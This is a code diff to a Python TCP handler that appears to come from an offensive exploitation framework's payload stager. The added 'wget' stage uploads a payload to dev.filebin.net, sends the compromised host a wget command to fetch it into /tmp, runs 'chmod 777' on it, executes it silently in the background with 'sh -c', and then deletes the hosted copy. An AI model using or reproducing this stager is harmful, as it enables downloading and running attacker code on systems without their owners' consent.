@@ -72,9 +72,33 @@ class Handler(TCP):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
+
+        wget_bin = binascii.hexlify(os.urandom(8)).decode()
+        wget_file = binascii.hexlify(os.urandom(8)).decode()
         
+        wget_container = f"https://dev.filebin.net/{wget_bin}"
+        wget_server = f"https://dev.filebin.net/{wget_bin}/{wget_file}"
+
         wget_stream = "wget '{}' -qO {}"
-        wget_server = "https://dev.filebin.net"
+
+        requests.post(wget_server.format(wget_bin, wget_file), data=payload)
+        self.badges.output_process("Uploading payload...")
+
+        command = wget_stream.format(wget_server, filename)
+        if encode:
+            sender(*args, (command + '\n').encode())
+        else:
+            sender(*args, command)
+
+        args = args if args is not None else ""
+
+        self.badges.output_process("Executing payload...")
+        if encode:
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
+        else:
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+
+        requests.delete(wget_container)
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
@@ -100,6 +124,7 @@ class Handler(TCP):
 
         args = args if args is not None else ""
 
+        self.badges.output_process("Executing payload...")
         if encode:
             sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
@@ -129,6 +154,7 @@ class Handler(TCP):
 
         args = args if args is not None else ""
 
+        self.badges.output_process("Executing payload...")
         if encode:
             sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
